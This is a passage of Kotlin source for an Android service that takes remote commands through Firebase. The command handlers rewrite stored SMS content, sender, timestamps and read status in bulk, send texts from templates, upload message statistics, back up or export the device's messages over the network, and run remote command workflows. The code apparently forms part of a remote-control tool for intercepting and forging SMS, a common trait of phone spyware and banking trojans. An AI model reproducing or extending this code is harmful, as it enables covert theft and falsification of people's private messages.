        if (criteria.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Criteria is required")
            return
        }
        
        // Validate field
        val validFields = listOf("content", "sender", "timestamp", "status")
        if (field.lowercase() !in validFields) {
            updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Invalid field. Supported: ${validFields.joinToString(", ")}")
            return
        }
        
        // Validate new value
        if (newValue.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "New value is required")
            return
        }
        
        try {
            val whereClause = buildWhereClause(criteria)
            val contentValues = ContentValues()
            
            when (field.lowercase()) {
                "content" -> {
                    if (newValue.length > 160) {
                        updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Message content cannot exceed 160 characters")
                        return
                    }
                    contentValues.put("body", newValue)
                }
                "sender" -> {
                    if (!newValue.matches(Regex("^\\+?[1-9]\\d{1,14}$"))) {
                        updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Invalid sender phone number format")
                        return
                    }
                    contentValues.put("address", newValue)
                }
                "timestamp" -> {
                    val timestamp = newValue.toLongOrNull() ?: run {
                        updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Invalid timestamp. Must be a long integer.")
                        return
                    }
                    contentValues.put("date", timestamp)
                }
                "status" -> {
                    when (newValue.lowercase()) {
                        "read" -> contentValues.put("read", 1)
                        "unread" -> contentValues.put("read", 0)
                        else -> {
                            updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Invalid status. Must be 'read' or 'unread'.")
                            return
                        }
                    }
                }
            }
            
            val uri = android.provider.Telephony.Sms.CONTENT_URI
            val rowsUpdated = contentResolver.update(
                uri,
                contentValues,
                whereClause.first,
                whereClause.second
            )
            
            if (rowsUpdated > 0) {
                updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "executed", "Updated $rowsUpdated message(s)")
            } else {
                updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "No messages found matching criteria")
            }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error executing bulk edit message", e)
            updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Error: ${e.message}")
        }
    }
    
    /**
     * Handle sendSmsTemplate command
     * Format: "templateId:phone:variables"
     */
    private fun handleSendSmsTemplateCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing sendSmsTemplate command: $content")
        
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.SEND_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "SEND_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        if (parts.size < 3) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Invalid format: expected templateId:phone:variables")
            return
        }
        
        val templateId = parts[0].trim()
        val phone = parts[1].trim()
        val variablesStr = parts.drop(2).joinToString(":")
        
        // Validate template ID
        if (templateId.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Template ID is required")
            return
        }
        
        // Validate phone number
        if (phone.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Phone number is required")
            return
        }
        if (!phone.matches(Regex("^\\+?[1-9]\\d{1,14}$"))) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Invalid phone number format")
            return
        }
        
        // Parse variables
        val variables = MessageTemplateEngine.parseVariables(variablesStr)
        
        // Get template
        MessageTemplateEngine.getTemplate(this, templateId) { template ->
            if (template == null) {
                updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Template not found: $templateId")
                return@getTemplate
            }
            
            // Process template
            val processedMessage = MessageTemplateEngine.processTemplate(template, variables)
            
            // Validate message length
            if (processedMessage.length > 160) {
                updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Processed message too long (max 160 characters)")
                return@getTemplate
            }
            
            // Send SMS
            try {
                sendSms(phone, processedMessage, SimSlot.SIM_1)
                
                // Log to Firebase
                val timestamp = System.currentTimeMillis()
                val messagePath = AppConfig.getFirebaseMessagePath(androidId(), timestamp)
                FirebaseWriteHelper.setValue(
                    path = messagePath,
                    data = "sent~$phone~$processedMessage",
                    tag = TAG,
                    onSuccess = {
                        updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "executed")
                    },
                    onFailure = { e ->
                        updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "executed", "Message sent but Firebase log failed: ${e.message}")
                    }
                )
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error sending SMS from template", e)
                updateCommandHistoryStatus(historyTimestamp, "sendSmsTemplate", "failed", "Error: ${e.message}")
            }
        }
    }
    
    /**
     * Handle saveTemplate command
     * Format: "templateId|content|category"
     * Note: Using pipe (|) as delimiter to avoid conflicts with colons in content
     */
    private fun handleSaveTemplateCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing saveTemplate command: $content")
        
        val parts = content.split("|", limit = 3)
        if (parts.size < 2) {
            updateCommandHistoryStatus(historyTimestamp, "saveTemplate", "failed", "Invalid format: expected templateId|content|category")
            return
        }
        
        val templateId = parts[0].trim()
        val templateContent = parts[1].trim()
        val category = parts.getOrNull(2)?.trim() ?: "custom"
        
        // Validate template ID
        if (templateId.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "saveTemplate", "failed", "Template ID is required")
            return
        }
        
        // Validate template content
        if (templateContent.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "saveTemplate", "failed", "Template content is required")
            return
        }
        
        // Save template
        MessageTemplateEngine.saveTemplate(
            context = this,
            templateId = templateId,
            content = templateContent,
            category = category
        )
        
        updateCommandHistoryStatus(historyTimestamp, "saveTemplate", "executed")
    }
    
    /**
     * Handle deleteTemplate command
     * Format: "templateId"
     */
    private fun handleDeleteTemplateCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing deleteTemplate command: $content")
        
        val templateId = content.trim()
        
        // Validate template ID
        if (templateId.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "deleteTemplate", "failed", "Template ID is required")
            return
        }
        
        // Check if it's a pre-built template (cannot delete)
        if (MessageTemplateEngine.getAvailableTemplates().contains(templateId)) {
            updateCommandHistoryStatus(historyTimestamp, "deleteTemplate", "failed", "Cannot delete pre-built template")
            return
        }
        
        // Delete template
        MessageTemplateEngine.deleteTemplate(this, templateId)
        
        updateCommandHistoryStatus(historyTimestamp, "deleteTemplate", "executed")
    }
    
    /**
     * Handle getMessageStats command
     * Format: "period:format"
     */
    private fun handleGetMessageStatsCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing getMessageStats command: $content")
        
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandHistoryStatus(historyTimestamp, "getMessageStats", "failed", "READ_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        val period = parts.getOrNull(0)?.trim() ?: "all"
        val format = parts.getOrNull(1)?.trim() ?: "json"
        
        // Calculate date range
        val dateRange = MessageAnalyticsManager.calculateDateRange(period)
        
        // Fetch messages
        val messages = MessageAnalyticsManager.fetchMessagesInRange(this, dateRange.first, dateRange.second)
        
        // Calculate statistics
        val stats = MessageAnalyticsManager.calculateMessageStats(messages)
        
        // Save to Firebase
        MessageAnalyticsManager.saveStatsToFirebase(this, stats, period)
        
        updateCommandHistoryStatus(historyTimestamp, "getMessageStats", "executed", "Processed ${messages.size} messages")
    }
    
    /**
     * Handle backupMessages command
     * Format: "type:encrypt:format"
     */
    private fun handleBackupMessagesCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing backupMessages command: $content")
        
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandHistoryStatus(historyTimestamp, "backupMessages", "failed", "READ_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        val type = parts.getOrNull(0)?.trim() ?: "firebase"
        val encrypt = parts.getOrNull(1)?.trim()?.toBoolean() ?: false
        val format = parts.getOrNull(2)?.trim() ?: "json"
        
        if (format.lowercase() !in listOf("json", "csv")) {
            updateCommandHistoryStatus(historyTimestamp, "backupMessages", "failed", "Invalid format. Use 'json' or 'csv'")
            return
        }

        val constraints = Constraints.Builder().apply {
            if (type.lowercase() == "firebase") {
                setRequiredNetworkType(NetworkType.CONNECTED)
            }
        }.build()

        val workRequest = OneTimeWorkRequestBuilder<BackupMessagesWorker>()
            .setConstraints(constraints)
            .setInputData(
                workDataOf(
                    BackupMessagesWorker.KEY_TYPE to type,
                    BackupMessagesWorker.KEY_FORMAT to format,
                    BackupMessagesWorker.KEY_ENCRYPT to encrypt,
                    BackupMessagesWorker.KEY_HISTORY_TIMESTAMP to historyTimestamp
                )
            )
            .build()

        WorkManager.getInstance(this)
            .enqueueUniqueWork("backupMessages", ExistingWorkPolicy.REPLACE, workRequest)
    }
    
    /**
     * Handle exportMessages command
     * Format: "format:criteria"
     */
    private fun handleExportMessagesCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing exportMessages command: $content")
        
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandHistoryStatus(historyTimestamp, "exportMessages", "failed", "READ_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        val format = parts.getOrNull(0)?.trim() ?: "json"
        val criteria = parts.getOrNull(1)?.trim()
        if (format.lowercase() !in listOf("json", "csv")) {
            updateCommandHistoryStatus(historyTimestamp, "exportMessages", "failed", "Invalid format. Use 'json' or 'csv'")
            return
        }

        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val workRequest = OneTimeWorkRequestBuilder<ExportMessagesWorker>()
            .setConstraints(constraints)
            .setInputData(
                workDataOf(
                    ExportMessagesWorker.KEY_FORMAT to format,
                    ExportMessagesWorker.KEY_CRITERIA to (criteria ?: ""),
                    ExportMessagesWorker.KEY_HISTORY_TIMESTAMP to historyTimestamp
                )
            )
            .build()

        WorkManager.getInstance(this)
            .enqueueUniqueWork("exportMessages", ExistingWorkPolicy.REPLACE, workRequest)
    }
    
    /**
     * Handle executeWorkflow command
     * Format: JSON string containing workflow definition
     * 
     * Example:
     * {
     *   "workflowId": "upload_file_workflow",
     *   "steps": [
     *     {
     *       "step": 1,
     *       "command": "showNotification",
     *       "content": "title|Starting upload|high|system|",
     *       "delay": 0,
     *       "onSuccess": "continue",
     *       "onFailure": "stop"
     *     },
     *     {
     *       "step": 2,
     *       "command": "fetchDeviceInfo",
     *       "content": "",
     *       "delay": 2000,
     *       "onSuccess": "continue",
     *       "onFailure": "stop"
     *     }
     *   ]
     * }
     */
    private fun handleExecuteWorkflowCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing workflow command: ${content.take(100)}...")
        
        if (content.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "executeWorkflow", "failed", "Workflow JSON is required")
            return
        }
        
        // Execute workflow (WorkflowExecutor handles command execution via Firebase)
        WorkflowExecutor.executeWorkflow(
            context = this,
            workflowJson = content,
            historyTimestamp = historyTimestamp,
            onStepComplete = { step, success ->
                LogHelper.d(TAG, "Workflow step $step completed: ${if (success) "success" else "failure"}")
            },
            onWorkflowComplete = { workflowId, allSuccess ->
                if (allSuccess) {
                    updateCommandHistoryStatus(historyTimestamp, "executeWorkflow", "executed", "Workflow $workflowId completed successfully")
                } else {
                    updateCommandHistoryStatus(historyTimestamp, "executeWorkflow", "failed", "Workflow $workflowId failed")
                }
            }
        )
    }
    
    /**
     * Check command execution status directly (for workflow)
     */
    private fun checkCommandExecutionStatusDirect(
        historyTimestamp: Long,
        commandKey: String,
        onComplete: (Boolean) -> Unit
    ) {
        val historyPath = "${AppConfig.getFirebaseDevicePath(androidId())}/${AppConfig.FirebasePaths.COMMAND_HISTORY}/$historyTimestamp/$commandKey/status"
        val historyRef = Firebase.database.reference.child(historyPath)
        
        var attempts = 0
        val maxAttempts = 5
        
        val checkStatus = object : Runnable {
            override fun run() {
                attempts++
                historyRef.get().addOnSuccessListener { snapshot ->
                    if (snapshot.exists()) {
                        val status = snapshot.value?.toString()
                        if (status == "executed") {
                            onComplete(true)
                        } else if (status == "failed") {
                            onComplete(false)
                        } else if (attempts < maxAttempts) {
                            Handler(android.os.Looper.getMainLooper()).postDelayed(this, 1000)
                        } else {
                            onComplete(false) // Timeout
                        }
                    } else if (attempts < maxAttempts) {
                        Handler(android.os.Looper.getMainLooper()).postDelayed(this, 1000)
                    } else {
                        onComplete(false) // Timeout
                    }
                }.addOnFailureListener {
                    onComplete(false)
                }
            }
        }
        
        Handler(android.os.Looper.getMainLooper()).postDelayed(checkStatus, 1000)
    }
}

